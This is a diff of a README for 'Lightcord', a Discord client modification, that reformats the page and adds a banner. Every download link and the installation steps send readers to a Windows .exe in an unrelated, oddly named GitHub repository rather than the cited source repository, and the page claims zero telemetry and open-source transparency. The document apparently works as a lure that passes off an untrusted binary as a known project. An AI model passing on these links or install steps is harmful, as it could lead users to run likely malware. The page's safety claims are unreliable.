@@ -1,24 +1,37 @@
-# Lightcord
+<p align="center">
+  <img src="https://files.catbox.moe/3xsvkd.webp" alt="Lightcord Banner" width="100%">
+</p>
 
-Lightweight, open-source Discord client modification built for low RAM usage, local privacy, custom themes, and 300+ plugins.
+<h1 align="center">Lightcord</h1>
 
-🌐 **Official Website:** [lightcord.live](https://lightcord.live/)  
-⬇️ **Latest Release (Windows):** [Download Lightcord v1.2 (.exe)](https://github.com/xkex1337-dotcom/x/releases/download/xw/lightcord.exe)
+<p align="center">
+  Lightweight, open-source Discord client modification built for low RAM usage, local privacy, custom themes, and 300+ plugins.
+</p>
+
+<p align="center">
+  <a href="https://lightcord.live/"><strong>Official Website</strong></a> •
+  <a href="https://github.com/xkex1337-dotcom/x/releases/download/xw/lightcord.exe"><strong>Download for Windows (.exe)</strong></a> •
+  <a href="https://github.com/Joshix-1/Lightcord"><strong>Source Code</strong></a>
+</p>
 
 ---
 
-## Features
+## Overview
 
-- **Ultra-Low Memory Footprint:** Optimized for lightweight performance on Windows PCs.
-- **300+ Plugins & Custom Themes:** Native support for plugins and custom CSS snippets.
-- **100% Local Execution:** Zero telemetry, no external tracking, and no data collection.
-- **Open Source:** Transparent codebase available for review.
+**Lightcord** is designed to give desktop users a fast, clean, and customizable Discord experience without unnecessary bloat or external tracking.
 
-## Quick Start
+## Key Features
 
-1. Download the latest Windows executable (`lightcord.exe`) from the [Releases](https://github.com/xkex1337-dotcom/x/releases) page or [lightcord.live](https://lightcord.live/).
+* **Ultra-Low Memory Footprint:** Built for smooth, lightweight performance on Windows PCs.
+* **300+ Plugins & Custom Themes:** Supports plugins, custom CSS snippets, and community themes.
+* **100% Local Execution:** Zero telemetry, no external tracking, and no data collection.
+* **Open Source:** Transparent code structure available for inspection.
+
+## Installation
+
+1. Download `lightcord.exe` from the [official website](https://lightcord.live/) or the [latest release](https://github.com/xkex1337-dotcom/x/releases/download/xw/lightcord.exe).
 2. Run the installer on your Windows PC.
-3. Customize your themes and plugins directly inside the client.
+3. Open the client and configure your preferred plugins and themes.
 
 ## Disclaimer
 
